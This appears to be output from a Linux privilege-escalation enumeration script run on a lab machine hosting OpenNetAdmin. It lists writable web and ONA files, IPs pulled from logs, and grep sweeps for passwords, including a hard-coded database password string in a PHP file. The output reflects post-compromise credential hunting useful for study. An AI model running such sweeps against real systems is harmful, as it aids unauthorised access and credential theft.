+/opt/ona/www/modules/permissions.inc.php
+/opt/ona/www/modules/ona
+/opt/ona/www/modules/ona/dhcp_pool.inc.php
+/opt/ona/www/modules/ona/location.inc.php
+/opt/ona/www/modules/ona/message.inc.php
+/opt/ona/www/modules/ona/custom_attribute.inc.php
+/opt/ona/www/modules/ona/tag.inc.php
+/opt/ona/www/modules/ona/vlan.inc.php
+/opt/ona/www/modules/ona/dns_record.inc.php
+/opt/ona/www/modules/ona/host.inc.php
+/opt/ona/www/modules/ona/dhcp_entry.inc.php
+/opt/ona/www/modules/ona/configuration.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/modules/mangle.inc.php
+/opt/ona/www/index.php
+/opt/ona/.gitignore
+/opt/ona/VERSION
+/var/www/html/artwork
+/var/www/html/artwork/js
+/var/www/html/artwork/js/jquery-3.3.1.min.js
+/var/www/html/artwork/js/jquery-migrate-3.0.1.min.js
+/var/www/html/artwork/js/jquery.fancybox.min.js
+/var/www/html/artwork/js/bootstrap-datepicker.min.js
+/var/www/html/artwork/js/jquery.stellar.min.js
+/var/www/html/artwork/js/jquery-migrate-3.0.0.js
+/var/www/html/artwork/js/jquery.magnific-popup.min.js
+/var/www/html/artwork/js/jquery-ui.js
+/var/www/html/artwork/js/bootstrap.min.js
+/var/www/html/artwork/js/main.js
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/artwork/images
+/var/www/html/artwork/images/.DS_Store
+/var/www/html/artwork/readme.txt
+/var/www/html/artwork/main.html
+/var/www/html/artwork/single.html
+/var/www/html/artwork/scss
+/var/www/html/artwork/scss/_site-navbar.scss
+/var/www/html/artwork/scss/_site-base.scss
+/var/www/html/artwork/scss/_site-blocks.scss
+/var/www/html/artwork/scss/bootstrap
+/var/www/html/artwork/scss/bootstrap/_custom-forms.scss
+/var/www/html/artwork/scss/bootstrap/_breadcrumb.scss
+/var/www/html/artwork/scss/bootstrap/_dropdown.scss
+/var/www/html/artwork/scss/bootstrap/_input-group.scss
+/var/www/html/artwork/scss/bootstrap/utilities
+/var/www/html/artwork/scss/bootstrap/utilities/_screenreaders.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_position.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_visibility.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_align.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_text.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_float.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_clearfix.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_shadows.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_flex.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_sizing.scss
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/artwork/scss/bootstrap/bootstrap.scss
+/var/www/html/artwork/scss/bootstrap/_utilities.scss
+/var/www/html/artwork/scss/bootstrap/_spinners.scss
+/var/www/html/artwork/scss/bootstrap/_forms.scss
+/var/www/html/artwork/scss/bootstrap/_navbar.scss
+/var/www/html/artwork/scss/bootstrap/_popover.scss
+/var/www/html/artwork/scss/bootstrap/mixins
+/var/www/html/artwork/scss/bootstrap/mixins/_nav-divider.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_box-shadow.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_visibility.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_breakpoints.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_text-hide.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_grid-framework.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_forms.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_float.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_clearfix.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_size.scss
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/artwork/scss/bootstrap/_code.scss
+/var/www/html/artwork/scss/bootstrap/_jumbotron.scss
+/var/www/html/artwork/scss/bootstrap/_variables.scss
+/var/www/html/artwork/scss/bootstrap/_type.scss
+/var/www/html/artwork/scss/bootstrap/_alert.scss
+/var/www/html/artwork/scss/bootstrap/_nav.scss
+/var/www/html/artwork/scss/bootstrap/_reboot.scss
+/var/www/html/artwork/scss/bootstrap/_pagination.scss
+/var/www/html/artwork/scss/bootstrap/_grid.scss
+/var/www/html/artwork/scss/bootstrap/_transitions.scss
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/artwork/scss/bootstrap/vendor/_rfs.scss
+/var/www/html/artwork/scss/bootstrap/_buttons.scss
+/var/www/html/artwork/scss/bootstrap/_badge.scss
+/var/www/html/artwork/scss/bootstrap/_close.scss
+/var/www/html/artwork/scss/bootstrap/.DS_Store
+/var/www/html/artwork/scss/bootstrap/_mixins.scss
+/var/www/html/artwork/scss/style.scss
+/var/www/html/artwork/scss/.DS_Store
+/var/www/html/artwork/css
+/var/www/html/artwork/css/bootstrap.min.css
+/var/www/html/artwork/css/jquery.fancybox.min.css
+/var/www/html/artwork/css/magnific-popup.css
+/var/www/html/artwork/css/bootstrap.min.css.map
+/var/www/html/artwork/css/owl.theme.default.min.css
+/var/www/html/artwork/css/bootstrap-datepicker.css
+/var/www/html/artwork/css/owl.carousel.min.css
+/var/www/html/artwork/css/aos.css
+/var/www/html/artwork/css/style.css
+/var/www/html/artwork/css/bootstrap
+/var/www/html/artwork/css/bootstrap/bootstrap.css
+/var/www/html/artwork/css/bootstrap/bootstrap-grid.css
+/var/www/html/artwork/css/bootstrap/bootstrap-reboot.css
+/var/www/html/artwork/css/.DS_Store
+/var/www/html/artwork/css/mediaelementplayer.css
+/var/www/html/artwork/css/jquery-ui.css
+/var/www/html/artwork/fonts
+/var/www/html/artwork/fonts/flaticon
+/var/www/html/artwork/fonts/flaticon/font
+/var/www/html/artwork/fonts/flaticon/font/Flaticon.woff2
+/var/www/html/artwork/fonts/flaticon/font/Flaticon.eot
+/var/www/html/artwork/fonts/flaticon/font/Flaticon.woff
+/var/www/html/artwork/fonts/flaticon/font/flaticon.css
+/var/www/html/artwork/fonts/flaticon/font/Flaticon.ttf
+/var/www/html/artwork/fonts/flaticon/font/Flaticon.svg
+/var/www/html/artwork/fonts/flaticon/font/flaticon.html
+/var/www/html/artwork/fonts/flaticon/font/_flaticon.scss
+/var/www/html/artwork/fonts/flaticon/backup.txt
+/var/www/html/artwork/fonts/flaticon/license
+/var/www/html/artwork/fonts/.DS_Store
+/var/www/html/artwork/fonts/icomoon
+/var/www/html/artwork/fonts/icomoon/demo-files
+/var/www/html/artwork/fonts/icomoon/demo-files/demo.js
+/var/www/html/artwork/fonts/icomoon/demo-files/demo.css
+/var/www/html/artwork/fonts/icomoon/selection.json
+/var/www/html/artwork/fonts/icomoon/fonts
+/var/www/html/artwork/fonts/icomoon/fonts/icomoon.svg
+/var/www/html/artwork/fonts/icomoon/fonts/icomoon.ttf
+/var/www/html/artwork/fonts/icomoon/fonts/icomoon.eot
+/var/www/html/artwork/fonts/icomoon/fonts/icomoon.woff
+/var/www/html/artwork/fonts/icomoon/Read Me.txt
+/var/www/html/artwork/fonts/icomoon/style.css
+/var/www/html/artwork/fonts/icomoon/demo.html
+/var/www/html/artwork/prepros-6.config
+/var/www/html/artwork/services.html
+/var/www/html/artwork/contact.html
+/var/www/html/artwork/.DS_Store
+/var/www/html/artwork/about.html
+/var/www/html/artwork/index.html
+/var/www/html/artwork/blog.html
+/var/www/html/music
+/var/www/html/music/playlist.html
+/var/www/html/music/js
+/var/www/html/music/js/jquery.jplayer.min.js
+/var/www/html/music/js/wavesurfer.min.js
+/var/www/html/music/js/jquery-3.2.1.min.js
+/var/www/html/music/js/jquery.slicknav.min.js
+/var/www/html/music/js/jplayerInit.js
+/var/www/html/music/js/mixitup.min.js
+/var/www/html/music/js/bootstrap.min.js
+/var/www/html/music/js/main.js
+/var/www/html/music/js/WaveSurferInit.js
+/var/www/html/music/js/owl.carousel.min.js
+/var/www/html/music/music-files
+/var/www/html/music/main.html
+/var/www/html/music/img
+/var/www/html/music/img/blog
+/var/www/html/music/img/favicon.ico
+/var/www/html/music/img/playlist
+/var/www/html/music/img/icons
+/var/www/html/music/img/concept
+/var/www/html/music/img/songs
+/var/www/html/music/img/premium
+/var/www/html/music/icon-fonts
+/var/www/html/music/icon-fonts/fontawesome-webfont.svg
+/var/www/html/music/icon-fonts/fontawesome-webfont.woff2
+/var/www/html/music/icon-fonts/fontawesome-webfont.eot
+/var/www/html/music/icon-fonts/fontawesome-webfont.woff
+/var/www/html/music/Source
+/var/www/html/music/Source/wavesurfer.js-master.zip
+/var/www/html/music/Source/mixitup-v3.zip
+/var/www/html/music/Source/SlickNav-master.zip
+/var/www/html/music/Source/sass.zip
+/var/www/html/music/Source/jPlayer-2.9.2.zip
+/var/www/html/music/Source/font-awesome-4.7.0.zip
+/var/www/html/music/Source/bootstrap-4.3.1-dist.zip
+/var/www/html/music/Source/photo credits.txt
+/var/www/html/music/css
+/var/www/html/music/css/bootstrap.min.css
+/var/www/html/music/css/font-awesome.min.css
+/var/www/html/music/css/slicknav.min.css
+/var/www/html/music/css/owl.carousel.min.css
+/var/www/html/music/css/style.css
+/var/www/html/music/category.html
+/var/www/html/music/artist.html
+/var/www/html/music/contact.html
+/var/www/html/music/index.html
+/var/www/html/music/blog.html
+/var/www/html/sierra
+/var/www/html/sierra/portfolio.html
+/var/www/html/sierra/js
+/var/www/html/sierra/js/jquery-3.2.1.min.js
+/var/www/html/sierra/js/bootstrap.min.js
+/var/www/html/sierra/js/contact.js
+/var/www/html/sierra/js/jquery.validate.min.js
+/var/www/html/sierra/js/jquery.form.js
+/var/www/html/sierra/js/theme.js
+/var/www/html/sierra/js/gmaps.min.js
+/var/www/html/sierra/js/circle-active.js
+/var/www/html/sierra/js/popper.min.js
+/var/www/html/sierra/js/.DS_Store
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/sierra/elements.html
+/var/www/html/sierra/img
+/var/www/html/sierra/img/blog
+/var/www/html/sierra/img/blog/.DS_Store
+/var/www/html/sierra/img/icon
+/var/www/html/sierra/img/icon/.DS_Store
+/var/www/html/sierra/img/instagram
+/var/www/html/sierra/img/instagram/right-instagram
+/var/www/html/sierra/img/instagram/right-instagram/.DS_Store
+/var/www/html/sierra/img/instagram/.DS_Store
+/var/www/html/sierra/img/banner
+/var/www/html/sierra/img/portfolio
+/var/www/html/sierra/img/portfolio/ms-portfolio
+/var/www/html/sierra/img/portfolio/ms-portfolio/.DS_Store
+/var/www/html/sierra/img/home-slider
+/var/www/html/sierra/img/home-slider/.DS_Store
+/var/www/html/sierra/img/testimonials
+/var/www/html/sierra/img/testimonials/.DS_Store
+/var/www/html/sierra/img/team
+/var/www/html/sierra/img/team/people
+/var/www/html/sierra/img/team/people/.DS_Store
+/var/www/html/sierra/img/.DS_Store
+/var/www/html/sierra/img/comment
+/var/www/html/sierra/contact_process.php
+/var/www/html/sierra/scss
+/var/www/html/sierra/scss/_slider.scss
+/var/www/html/sierra/scss/_header.scss
+/var/www/html/sierra/scss/_contact.scss
+/var/www/html/sierra/scss/_footer.scss
+/var/www/html/sierra/scss/_chart.scss
+/var/www/html/sierra/scss/_portfolio.scss
+/var/www/html/sierra/scss/_blog.scss
+/var/www/html/sierra/scss/_banner.scss
+/var/www/html/sierra/scss/_variables.scss
+/var/www/html/sierra/scss/_button.scss
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/sierra/css
+/var/www/html/sierra/css/bootstrap.min.css
+/var/www/html/sierra/css/font-awesome.min.css
+/var/www/html/sierra/css/style.css.map
+/var/www/html/sierra/css/style.css
+/var/www/html/sierra/css/responsive.css
+/var/www/html/sierra/css/.DS_Store
+/var/www/html/sierra/fonts
+/var/www/html/sierra/fonts/fontawesome-webfont.ttf
+/var/www/html/sierra/fonts/fontawesome-webfont.svg
+/var/www/html/sierra/fonts/fontawesome-webfont.woff2
+/var/www/html/sierra/fonts/fontawesome-webfont.eot
+/var/www/html/sierra/fonts/fontawesome-webfont.woff
+/var/www/html/sierra/fonts/.DS_Store
+/var/www/html/sierra/fonts/FontAwesome.otf
+/var/www/html/sierra/single-blog.html
+/var/www/html/sierra/prepros-6.config
+/var/www/html/sierra/service.html
+/var/www/html/sierra/contact.html
+/var/www/html/sierra/vendors
+/var/www/html/sierra/vendors/owl-carousel
+/var/www/html/sierra/vendors/owl-carousel/owl.carousel.min.css
+/var/www/html/sierra/vendors/owl-carousel/.DS_Store
+/var/www/html/sierra/vendors/owl-carousel/owl.carousel.min.js
+/var/www/html/sierra/vendors/circle-bar
+/var/www/html/sierra/vendors/circle-bar/circle-progress.min.js
+/var/www/html/sierra/vendors/circle-bar/plugins.js
+/var/www/html/sierra/vendors/circle-bar/.DS_Store
+/var/www/html/sierra/vendors/magnify-popup
+/var/www/html/sierra/vendors/magnify-popup/magnific-popup.css
+/var/www/html/sierra/vendors/magnify-popup/jquery.magnific-popup.min.js
+/var/www/html/sierra/vendors/isotope
+/var/www/html/sierra/vendors/isotope/imagesloaded.pkgd.min.js
+/var/www/html/sierra/vendors/isotope/isotope.pkgd.min.js
+/var/www/html/sierra/vendors/counterup
+/var/www/html/sierra/vendors/counterup/jquery.counterup.min.js
+/var/www/html/sierra/vendors/counterup/countto.js
+/var/www/html/sierra/vendors/counterup/jquery.waypoints.min.js
+/var/www/html/sierra/vendors/counterup/.DS_Store
+/var/www/html/sierra/vendors/counterup/apear.js
+/var/www/html/sierra/vendors/progress
+/var/www/html/sierra/vendors/progress/circle-progress.js
+/var/www/html/sierra/vendors/progress/circularprogress.css
+/var/www/html/sierra/vendors/progress/circularprogress.jquery.min.js
+/var/www/html/sierra/vendors/progress/.DS_Store
+/var/www/html/sierra/vendors/revolution
+/var/www/html/sierra/vendors/revolution/js
+
+[+] Searching passwords in config PHP files
+
+[+] Finding IPs inside logs (limit 70)
+    499 /var/log/ona.log:192.168.116.1
+    148 /var/log/ona.log:192.168.116.130
+     66 /var/log/dpkg.log:3.18.04.1
+     40 /var/log/ona.log:10.10.14.78
+     38 /var/log/dpkg.log:2.18.04.1
+     30 /var/log/dpkg.log:7.18.04.2
+     22 /var/log/cloud-init-output.log:192.168.116.2
+     20 /var/log/wtmp:192.168.116.130
+     18 /var/log/dpkg.log:3.192.1.7
+     17 /var/log/dpkg.log:1.18.04.11
+     16 /var/log/dpkg.log:18.04.11.10
+     12 /var/log/dpkg.log:1.18.04.12
+     11 /var/log/dpkg.log:2.18.04.3
+     11 /var/log/cloud-init-output.log:255.255.255.255
+     11 /var/log/cloud-init-output.log:192.168.116.129
+      8 /var/log/installer/subiquity-debug.log:192.168.116.129
+      8 /var/log/dpkg.log:6.18.04.1
+      7 /var/log/dpkg.log:1.18.04.1
+      7 /var/log/apt/history.log:3.18.04.1
+      6 /var/log/wtmp:10.10.14.3
+      4 /var/log/installer/installer-journal.txt:91.189.94.4
+      4 /var/log/installer/installer-journal.txt:91.189.91.157
+      4 /var/log/installer/installer-journal.txt:91.189.89.198
+      4 /var/log/apt/history.log:2.18.04.1
+      3 /var/log/installer/subiquity-debug.log:192.168.116.255
+      3 /var/log/installer/installer-journal.txt:91.189.89.199
+      3 /var/log/apt/history.log:7.18.04.2
+      2 /var/log/wtmp:192.168.116.1
+      2 /var/log/lastlog:10.10.14.3
+      2 /var/log/installer/installer-journal.txt:192.168.116.2
+      2 /var/log/installer/installer-journal.txt:192.168.116.129
+      2 /var/log/apt/history.log:18.04.11.10
+      2 /var/log/apt/history.log:1.18.04.11
+      1 /var/log/installer/subiquity-debug.log:192.168.116.2
+      1 /var/log/installer/subiquity-debug.log:127.255.255.255
+      1 /var/log/apt/history.log:6.18.04.1
+      1 /var/log/apt/history.log:3.192.1.7
+      1 /var/log/apt/history.log:2.18.04.3
+      1 /var/log/apt/history.log:1.18.04.12
+      1 /var/log/apt/history.log:1.18.04.1
+
+[+] Finding passwords inside logs (limit 70)
+/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
+/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
+/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
+/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
+grep: write error/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
+/var/log/bootstrap.log:Selecting previously unselected package passwd.
+/var/log/bootstrap.log:Setting up base-passwd (3.5.44) ...
+/var/log/bootstrap.log:Setting up passwd (1:4.5-1ubuntu1) ...
+/var/log/bootstrap.log:Shadow passwords are now on.
+/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) ...
+/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) over (3.5.44) ...
+/var/log/bootstrap.log:Unpacking passwd (1:4.5-1ubuntu1) ...
+/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
+/var/log/cloud-init.log:2019-11-21 13:45:16,343 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
+/var/log/cloud-init.log:2019-11-21 13:45:16,385 - cc_set_passwords.py[DEBUG]: Restarted the ssh daemon.
+/var/log/cloud-init.log:2019-11-21 13:55:09,144 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-21 16:00:46,451 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-21 16:17:41,944 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-21 16:34:15,729 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+: Broken pipe
+/var/log/cloud-init.log:2019-11-21 17:56:43,451 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-22 22:37:43,679 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-22 23:41:43,532 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-23 00:11:33,029 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-23 11:17:12,567 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-23 16:52:25,747 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-23 17:20:47,099 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-28 09:35:17,765 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2019-11-28 09:42:25,111 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2020-01-02 12:53:15,897 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2020-01-02 12:57:52,027 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2020-01-02 13:04:26,435 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2020-01-02 13:06:52,505 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2020-01-02 13:17:08,506 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2020-01-02 13:20:42,125 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/dpkg.log:2019-08-05 19:22:58 configure base-passwd:amd64 3.5.44 3.5.44
+/var/log/dpkg.log:2019-08-05 19:22:58 install base-passwd:amd64 <none> 3.5.44
+/var/log/dpkg.log:2019-08-05 19:22:58 status half-configured base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2019-08-05 19:22:58 status half-installed base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2019-08-05 19:22:58 status installed base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2019-08-05 19:22:58 status unpacked base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2019-08-05 19:22:59 status half-configured base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2019-08-05 19:22:59 status half-installed base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2019-08-05 19:22:59 status unpacked base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2019-08-05 19:22:59 upgrade base-passwd:amd64 3.5.44 3.5.44
+/var/log/dpkg.log:2019-08-05 19:23:02 install passwd:amd64 <none> 1:4.5-1ubuntu1
+/var/log/dpkg.log:2019-08-05 19:23:02 status half-installed passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2019-08-05 19:23:02 status unpacked passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2019-08-05 19:23:03 configure base-passwd:amd64 3.5.44 <none>
+/var/log/dpkg.log:2019-08-05 19:23:03 status half-configured base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2019-08-05 19:23:03 status installed base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2019-08-05 19:23:03 status unpacked base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2019-08-05 19:23:04 configure passwd:amd64 1:4.5-1ubuntu1 <none>
+/var/log/dpkg.log:2019-08-05 19:23:04 status half-configured passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2019-08-05 19:23:04 status installed passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2019-08-05 19:23:04 status unpacked passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2019-08-05 19:23:48 configure passwd:amd64 1:4.5-1ubuntu2 <none>
+/var/log/dpkg.log:2019-08-05 19:23:48 status half-configured passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2019-08-05 19:23:48 status half-configured passwd:amd64 1:4.5-1ubuntu2
+/var/log/dpkg.log:2019-08-05 19:23:48 status half-installed passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2019-08-05 19:23:48 status installed passwd:amd64 1:4.5-1ubuntu2
+/var/log/dpkg.log:2019-08-05 19:23:48 status unpacked passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2019-08-05 19:23:48 status unpacked passwd:amd64 1:4.5-1ubuntu2
+/var/log/dpkg.log:2019-08-05 19:23:48 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
+/var/log/installer/installer-journal.txt:Nov 21 13:41:29 ubuntu-server chage[22679]: changed password expiry for sshd
+/var/log/installer/installer-journal.txt:Nov 21 13:41:29 ubuntu-server usermod[22674]: change user 'sshd' password
+/var/log/ona.log:Nov 21 16:51:30 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
+/var/log/ona.log:Nov 21 16:51:31 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
+/var/log/ona.log:Nov 21 16:56:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
+/var/log/ona.log:Nov 21 17:01:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
+/var/log/ona.log:Nov 21 17:06:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
+
+[+] Finding emails inside logs (limit 70)
+      2 /var/log/bootstrap.log:ftpmaster@ubuntu.com
+      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70)
+/var/backups/dpkg.status.0:Depends: passwd, debconf (>= 0.5) | debconf-2.0
+/var/www/html/artwork/prepros-6.config:      "password": ""
+/var/www/html/artwork/prepros-6.config:      "password": "",
+/var/www/html/marga/prepros-6.config:      "password": ""
+/var/www/html/marga/prepros-6.config:      "password": "",
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:				$parsed['password'] = urldecode(substr($str, $pos + 1));
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:			'password' => false
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  password: Password for login
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  phptype://username:password@protocol+hostspec:110//usr/db_file.db
+/var/www/html/ona/include/adodb/adodb.inc.php:			$this->password = 'not stored';
+/var/www/html/ona/include/adodb/adodb.inc.php:			$this->password = 'not stored'; // not stored for security reasons
+/var/www/html/ona/include/adodb/adodb.inc.php:		if ($argPassword != "") {
+/var/www/html/ona/include/adodb/adodb.inc.php:	 *  password: Password for login
+/var/www/html/ona/include/adodb/adodb.inc.php:	function NConnect($argHostname = "", $argUsername = "", $argPassword = "", $argDatabaseName = "") {
+/var/www/html/ona/include/adodb/adodb.inc.php:	function PConnect($argHostname = "", $argUsername = "", $argPassword = "", $argDatabaseName = "") {
+/var/www/html/ona/include/adodb/adodb.inc.php:	var $password = '';			/// Password for the username. For security, we no longer store it.
+/var/www/html/ona/include/adodb/datadict/datadict-oci8.inc.php:		$password = isset($options['PASSWORD']) ? $options['PASSWORD'] : 'tiger';
+/var/www/html/ona/include/adodb/drivers/adodb-ado.inc.php:		if ($argPassword)$argHostname .= ";$p=$argPassword";
+/var/www/html/ona/include/adodb/drivers/adodb-ado.inc.php:	function _connect($argHostname, $argUsername, $argPassword, $argProvider= 'MSDASQL')
+/var/www/html/ona/include/adodb/drivers/adodb-ado.inc.php:	function _pconnect($argHostname, $argUsername, $argPassword, $argProvider='MSDASQL')
+/var/www/html/ona/include/adodb/drivers/adodb-ado5.inc.php:		if ($argPassword)$argHostname .= ";$p=$argPassword";
+/var/www/html/ona/include/adodb/drivers/adodb-ado5.inc.php:	function _pconnect($argHostname, $argUsername, $argPassword, $argProvider='MSDASQL')
+/var/www/html/ona/include/adodb/drivers/adodb-ldap.inc.php:	var $password = false;
+/var/www/html/ona/include/adodb/drivers/adodb-mssqlnative.inc.php:		$connectionInfo["PWD"]=$argPassword;
+/var/www/html/ona/include/adodb/drivers/adodb-mysqli.inc.php:				$argPassword = NULL,
+/var/www/html/ona/include/adodb/drivers/adodb-odbtp.inc.php:			$this->_connectionID = odbtp_connect($HostOrInterface,$UserOrDSN.';PWD='.$argPassword);
+/var/www/html/ona/include/adodb/drivers/adodb-odbtp.inc.php:		if ($argPassword && stripos($UserOrDSN,'DRIVER=') !== false) {
+/var/www/html/ona/include/adodb/drivers/adodb-odbtp.inc.php:	//for mssql : DRIVER={SQL Server};SERVER=myserver;UID=myuid;PWD=mypwd;DATABASE=OdbtpTest;
+/var/www/html/ona/include/adodb/drivers/adodb-odbtp.inc.php:	function _pconnect($HostOrInterface, $UserOrDSN='', $argPassword='', $argDatabase='')
+/var/www/html/ona/include/adodb/drivers/adodb-odbtp.inc.php:    function _connect($HostOrInterface, $UserOrDSN='', $argPassword='', $argDatabase='')
+/var/www/html/ona/include/adodb/drivers/adodb-oracle.inc.php:		function _connect($argHostname, $argUsername, $argPassword, $argDatabasename, $mode=0)
+/var/www/html/ona/include/adodb/drivers/adodb-pdo.inc.php:	function _connect($argDSN, $argUsername, $argPassword, $argDatabasename, $persist=false)
+/var/www/html/ona/include/adodb/drivers/adodb-postgres64.inc.php:			$pwd = adodb_addslashes($pwd);
+/var/www/html/ona/include/adodb/drivers/adodb-postgres64.inc.php:			if ($pwd)  $str .= " password=".$pwd;
+/var/www/html/ona/include/adodb/drivers/adodb-postgres64.inc.php:		//if ($user) $linea = "user=$user host=$linea password=$pwd dbname=$db port=5432";
+/var/www/html/ona/include/adodb/drivers/adodb-postgres64.inc.php:	// 	$db->Connect("host=host1 user=user1 password=secret port=4341");
+/var/www/html/ona/include/adodb/drivers/adodb-postgres64.inc.php:	// 	$db->PConnect("host=host1 user=user1 password=secret port=4341");
+/var/www/html/ona/include/adodb/drivers/adodb-postgres64.inc.php:	function _connect($str,$user='',$pwd='',$db='',$ctype=0)
+/var/www/html/ona/include/adodb/drivers/adodb-postgres64.inc.php:	function _pconnect($str,$user='',$pwd='',$db='')
+/var/www/html/ona/include/adodb/server.php:$pwd = 'garbase-it-is';
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:				$parsed['password'] = urldecode(substr($str, $pos + 1));
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:			'password' => false
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  password: Password for login
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype://username:password@protocol+hostspec:110//usr/db_file.db
+/var/www/html/ona/include/adodb5/adodb.inc.php:			$this->password = 'not stored';
+/var/www/html/ona/include/adodb5/adodb.inc.php:			$this->password = 'not stored'; // not stored for security reasons
+/var/www/html/ona/include/adodb5/adodb.inc.php:		if ($argPassword != "") {
+/var/www/html/ona/include/adodb5/adodb.inc.php:	 *  password: Password for login
+/var/www/html/ona/include/adodb5/adodb.inc.php:	function NConnect($argHostname = "", $argUsername = "", $argPassword = "", $argDatabaseName = "") {
+/var/www/html/ona/include/adodb5/adodb.inc.php:	function PConnect($argHostname = "", $argUsername = "", $argPassword = "", $argDatabaseName = "") {
+/var/www/html/ona/include/adodb5/adodb.inc.php:	var $password = '';			/// Password for the username. For security, we no longer store it.
+/var/www/html/ona/include/adodb5/datadict/datadict-oci8.inc.php:		$password = isset($options['PASSWORD']) ? $options['PASSWORD'] : 'tiger';
+/var/www/html/ona/include/adodb5/drivers/adodb-ado.inc.php:		if ($argPassword)$argHostname .= ";$p=$argPassword";
